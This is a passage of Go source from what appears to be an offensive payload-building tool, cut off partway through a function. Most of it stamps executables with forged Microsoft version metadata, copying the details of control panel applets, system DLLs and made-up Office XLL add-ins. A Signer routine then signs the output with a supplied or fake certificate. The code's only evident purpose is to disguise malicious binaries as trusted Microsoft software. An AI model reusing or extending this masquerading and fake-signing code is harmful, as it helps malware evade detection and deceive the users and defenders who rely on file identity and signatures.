			vi.StringFileInfo.LegalTrademarks = ""
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 11
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Internet Explorer"
			vi.StringFileInfo.ProductVersion = "11.00.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.OriginalFilename = "UrlMon.dll"
		}
		if name == "win32u" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "Win32u"
			vi.StringFileInfo.FileDescription = "Win32u"
			vi.StringFileInfo.FileVersion = "10.0.18362.900 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.LegalTrademarks = ""
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.900"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.OriginalFilename = "Win32u"
		}
		if name == "appwizard" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "appwiz.cpl"
			vi.StringFileInfo.FileDescription = "Shell Application Manager"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "APPWIZ.CPL.MUI"
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "appwiz.cpl"
		}
		if name == "bthprop" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "bthprops.cpl"
			vi.StringFileInfo.FileDescription = "Bluetooth Control Panel Applet"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "bluetooth.cpl.mui"
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "bthprops.cpl"
		}
		if name == "desktop" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "desk.cpl"
			vi.StringFileInfo.FileDescription = "Desktop Settings Control Panel"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "DESK.CPL.MUI"
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "DESK"

		}
		if name == "netfirewall" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "Firewall.cpl"
			vi.StringFileInfo.FileDescription = "Windows Defender Firewall Control Panel DLL Launching Stub"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "Firewall.cpl"
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "Firewall.cpl"
		}
		if name == "FlashPlayer" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = " Adobe Flash Player Control Panel Applet 32.0"
			vi.StringFileInfo.FileDescription = " Adobe Flash Player Control Panel Applet"
			vi.StringFileInfo.FileVersion = "32.0.0.255"
			vi.StringFileInfo.LegalCopyright = " Copyright © 1996-2019 Adobe. All Rights Reserved. Adobe and Flash are either trademarks or registered trademarks in the United States and/or other countries."
			vi.StringFileInfo.OriginalFilename = "FlashPlayerCPLApp.cpl"
			vi.FixedFileInfo.ProductVersion.Patch = 0
			vi.FixedFileInfo.ProductVersion.Major = 32
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "32.0.0.255"
			vi.FixedFileInfo.FileVersion.Major = 32
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 0
			vi.FixedFileInfo.FileVersion.Build = 255
			vi.StringFileInfo.InternalName = "FlashPlayerCPLApp.cpl"
		}
		if name == "hardwarewiz" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "hdwwiz.cpl"
			vi.StringFileInfo.FileDescription = "Add Hardware Control Panel Applet"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "hdwwiz.cpl.mui"
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "hdwwiz"
		}
		if name == "inet" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "inetcpl.cpl"
			vi.StringFileInfo.FileDescription = "Internet Control Panel"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = ""
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "inetcpl.cpl"
		}
		if name == "control" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "intl.cpl"
			vi.StringFileInfo.FileDescription = "Control Panel DLL"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = ""
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "CONTROL"
		}
		if name == "irprop" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "irprops.cpl"
			vi.StringFileInfo.FileDescription = "Infrared Control Panel Applet"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "irprops.cpl"
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "Infrared Properties"
		}
		if name == "Game" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "joy.cpl"
			vi.StringFileInfo.FileDescription = "Game Controllers Control Panel Applet"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "JOY.CPL.MUI"
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "JOY.CPL"
		}
		if name == "inputs" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "main.cpl"
			vi.StringFileInfo.FileDescription = "Mouse and Keyboard Control Panel Applets"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "main.cpl.mui"
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "main.cpl"

		}
		if name == "mimosys" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "mmsys.dll"
			vi.StringFileInfo.FileDescription = "Audio Control Panel"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "MMSys.cpl.mui"
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "mmsys.cpl"
		}
		if name == "ncp" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "ncpa.cpl"
			vi.StringFileInfo.FileDescription = "Network Connections Control-Panel Stub"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "ncpa.cpl.mui"
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "ncpa.cpl"
		}
		if name == "power" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "powercfg.cpl"
			vi.StringFileInfo.FileDescription = "Power Management Configuration Control Panel Applet"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "POWERCFG.CPL.MUI"
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "powercfg.cpl"
		}
		if name == "speech" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "sapi.cpl"
			vi.StringFileInfo.FileDescription = "Speech UX Control Panel"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "sapi.cpl.mui"
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "sapi.cpl"
		}

		if name == "system" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "sysdm.cpl"
			vi.StringFileInfo.FileDescription = "System Applet for the Control Panel"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "sysdm.cpl.mui"
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "sysdm.cpl"
		}
		if name == "Tablet" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "TabletPC.cpl"
			vi.StringFileInfo.FileDescription = "Tablet PC Control Panel"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "tabletpc.cpl.mui"
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "TabletPC.cpl"
		}
		if name == "telephone" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "telephon.cpl"
			vi.StringFileInfo.FileDescription = "Telephony Control Panel"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "telephon.cpl.mui"
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "telephon.cpl"
		}
		if name == "datetime" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "timedate.cpl"
			vi.StringFileInfo.FileDescription = "Time Date Control Panel Applet"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "timedate.cpl.mui"
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "timedate.cpl"
		}
		if name == "winsec" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "wscui.cpl"
			vi.StringFileInfo.FileDescription = "Security and Maintenance"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "wscui.cpl.mui"
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "wscui.cpl"
		}
		if name == "Timesheet" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "Timesheet.xll "
			vi.StringFileInfo.FileDescription = "Timesheet ToolPak"
			vi.StringFileInfo.FileVersion = "16.0.10001.10000"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "Timesheet.xll"
			vi.FixedFileInfo.ProductVersion.Patch = 10001
			vi.FixedFileInfo.ProductVersion.Major = 16
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft Office"
			vi.StringFileInfo.ProductVersion = "16.0.10001.10000"
			vi.FixedFileInfo.FileVersion.Major = 16
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 10001
			vi.FixedFileInfo.FileVersion.Build = 10000
			vi.StringFileInfo.InternalName = "Timesheet.xll"
		}
		if name == "Reports" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "Reports.xll "
			vi.StringFileInfo.FileDescription = "Report ToolPak"
			vi.StringFileInfo.FileVersion = "16.0.10001.10000"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "Reports.xll"
			vi.FixedFileInfo.ProductVersion.Patch = 10001
			vi.FixedFileInfo.ProductVersion.Major = 16
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft Office"
			vi.StringFileInfo.ProductVersion = "16.0.10001.10000"
			vi.FixedFileInfo.FileVersion.Major = 16
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 10001
			vi.FixedFileInfo.FileVersion.Build = 10000
			vi.StringFileInfo.InternalName = "Reports.xll"
		}
		if name == "Zoom" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "Zoom.xll"
			vi.StringFileInfo.FileDescription = "Zoom Addon ToolPak"
			vi.StringFileInfo.FileVersion = "16.0.10001.10000"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "Zoom.xll"
			vi.FixedFileInfo.ProductVersion.Patch = 10001
			vi.FixedFileInfo.ProductVersion.Major = 16
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft Office"
			vi.StringFileInfo.ProductVersion = "16.0.10001.10000"
			vi.FixedFileInfo.FileVersion.Major = 16
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 10001
			vi.FixedFileInfo.FileVersion.Build = 10000
			vi.StringFileInfo.InternalName = "Zoom.xll"
		}
		if name == "Updates" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "Updates.xll "
			vi.StringFileInfo.FileDescription = "Microsoft Update ToolPak"
			vi.StringFileInfo.FileVersion = "16.0.10001.10000"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "Updates.xll"
			vi.FixedFileInfo.ProductVersion.Patch = 10001
			vi.FixedFileInfo.ProductVersion.Major = 16
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft Office"
			vi.StringFileInfo.ProductVersion = "16.0.10001.10000"
			vi.FixedFileInfo.FileVersion.Major = 16
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 10001
			vi.FixedFileInfo.FileVersion.Build = 10000
			vi.StringFileInfo.InternalName = "Updates.xll"
		}

		if name == "Calendar" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "Calendar.xll "
			vi.StringFileInfo.FileDescription = "Calendar ToolPak"
			vi.StringFileInfo.FileVersion = "16.0.10001.10000"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "Calendar.xll"
			vi.FixedFileInfo.ProductVersion.Patch = 10001
			vi.FixedFileInfo.ProductVersion.Major = 16
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft Office"
			vi.StringFileInfo.ProductVersion = "16.0.10001.10000"
			vi.FixedFileInfo.FileVersion.Major = 16
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 10001
			vi.FixedFileInfo.FileVersion.Build = 10000
			vi.StringFileInfo.InternalName = "Calendar.xll"
		}
		if name == "Memo" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "Memo.xll "
			vi.StringFileInfo.FileDescription = "Memo ToolPak"
			vi.StringFileInfo.FileVersion = "16.0.10001.10000"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "Memo.xll"
			vi.FixedFileInfo.ProductVersion.Patch = 10001
			vi.FixedFileInfo.ProductVersion.Major = 16
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft Office"
			vi.StringFileInfo.ProductVersion = "16.0.10001.10000"
			vi.FixedFileInfo.FileVersion.Major = 16
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 10001
			vi.FixedFileInfo.FileVersion.Build = 10000
			vi.StringFileInfo.InternalName = "Memo.xll"
		}
		if name == "Desk" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "Desk.xll "
			vi.StringFileInfo.FileDescription = "Office Desktop ToolPak"
			vi.StringFileInfo.FileVersion = "16.0.10001.10000"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "Desk.xll"
			vi.FixedFileInfo.ProductVersion.Patch = 10001
			vi.FixedFileInfo.ProductVersion.Major = 16
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft Office"
			vi.StringFileInfo.ProductVersion = "16.0.10001.10000"
			vi.FixedFileInfo.FileVersion.Major = 16
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 10001
			vi.FixedFileInfo.FileVersion.Build = 10000
			vi.StringFileInfo.InternalName = "Desk.xll"
		}

		if name == "Appwiz" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "Appwiz.xll "
			vi.StringFileInfo.FileDescription = "Application Installer ToolPak"
			vi.StringFileInfo.FileVersion = "16.0.10001.10000"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "Appwiz.xll"
			vi.FixedFileInfo.ProductVersion.Patch = 10001
			vi.FixedFileInfo.ProductVersion.Major = 16
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft Office"
			vi.StringFileInfo.ProductVersion = "16.0.10001.10000"
			vi.FixedFileInfo.FileVersion.Major = 16
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 10001
			vi.FixedFileInfo.FileVersion.Build = 10000
			vi.StringFileInfo.InternalName = "Appwiz.xll"
		}
	}
	vi.VarFileInfo.Translation.LangID = goversioninfo.LangID(1033)
	vi.VarFileInfo.Translation.CharsetID = goversioninfo.CharsetID(1200)

	vi.Build()
	vi.Walk()

	var archs []string
	archs = []string{"amd64"}
	for _, item := range archs {
		fileout := "resource_windows.syso"
		if err := vi.WriteSyso(fileout, item); err != nil {
			log.Printf("Error writing syso: %v", err)
			os.Exit(3)
		}
	}
	fmt.Println("[+] Created Embedded Resource File With " + name + "'s Properties")
	return name
}

func Signer(domain string, password string, valid string, inputFile string) {
	outFile := inputFile

	if valid != "" {
		fmt.Println("[*] Signing " + inputFile + " With a Valid Cert " + valid)
		os.Rename(inputFile, inputFile+".old")
		inputFile = inputFile + ".old"
		SignExecutable(password, valid, inputFile, outFile)

	} else {
		password := VarNumberLength(8, 12)
		pfx := domain + ".pfx"
		fmt.Println("[*] Signing " + inputFile + " With a Fake Cert")
		os.Rename(inputFile, inputFile+".old")
